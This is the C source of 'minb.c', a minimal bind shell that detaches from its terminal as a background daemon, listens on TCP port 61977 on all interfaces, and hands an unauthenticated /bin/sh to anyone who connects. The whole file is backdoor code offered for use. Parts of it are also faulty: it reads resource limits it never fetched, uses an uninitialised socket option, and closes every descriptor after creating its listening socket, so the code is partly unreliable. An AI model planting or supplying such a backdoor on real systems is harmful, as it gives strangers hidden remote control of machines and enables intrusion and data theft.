/*
 * minb.c - a minimal bind shell
 * By jet (0xjet.github.io)
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <unistd.h>

#define PORT    61977
#define MAXCONN 5
#define SHELL   "/bin/sh"

void
die (char *s)
{
        perror(s);
        exit(EXIT_FAILURE);
}

int
main (int argc, char **argv)
{
        pid_t pid;
        struct sigaction sa;
        struct rlimit rl;
        int i, server_sockfd, client_sockfd, stat, socklen, sockrec, sockopt, client_addr_len;
        struct sockaddr_in server_addr, client_addr;

        /*
         * Clear file creation mask
         */
        umask(0);

        /*
         * Become a session leader to lose controlling terminal
         */
        if ((pid=fork()) < 0 )
                die("fork fail");
        else if (pid != 0) /* parent */
                exit(0);
        setsid();

        /*
         * Ensure future open() won't allocate a controling terminal
         */
        sa.sa_handler = SIG_IGN;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        if (sigaction(SIGHUP, &sa, NULL) < 0)
                die("can’t ignore SIGHUP");
        if ((pid = fork()) < 0)
                die("can't double fork");
        else if (pid != 0) /* parent */
                exit(0);

        /*
         * Change current working directory to root
         */
        if (chdir("/") < 0)
                die("can't change working dir to root");


        if ((server_sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) 
                die("Error: could not create socket");

        /* 
         * Close all open file descriptors
         */
        if (rl.rlim_max == RLIM_INFINITY)
                rl.rlim_max = 1024;
        for (i = 0; i < rl.rlim_max; i++)
                close(i);

        /*
         * Bind port and listen for incoming connections
         */
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

        if (setsockopt(server_sockfd, SOL_SOCKET, SO_REUSEADDR, (void *) &sockopt, sizeof(sockopt)) < 0)
                die("can't set socket options");

        if (bind(server_sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) != 0)
                die("can't bind socket");

        if (listen(server_sockfd, MAXCONN) != 0)
                die("can't listen()");  

        while (1) {
                client_addr_len = sizeof(client_addr);
                if ((client_sockfd = accept(server_sockfd, (struct sockaddr *) &client_addr, &client_addr_len)) < 0)
                        die("can't accept()");

                /*
                 * Fork a child to attend this connection
                 */
                if ((pid = fork()) < 0)
                        die("can't fork() to attend the connection");
                else if (pid != 0) { /* parent: close socket and wait for the child */
                        close(client_sockfd);
                        waitpid(0, &stat, 0);
                }
                else { /* child: fix the environment and spawn a shell */
                        close(server_sockfd);   
                        dup2(client_sockfd, STDIN_FILENO);
                        dup2(client_sockfd, STDOUT_FILENO);
                        dup2(client_sockfd, STDERR_FILENO);
                        execve(SHELL, NULL, NULL);
                }
        }
}
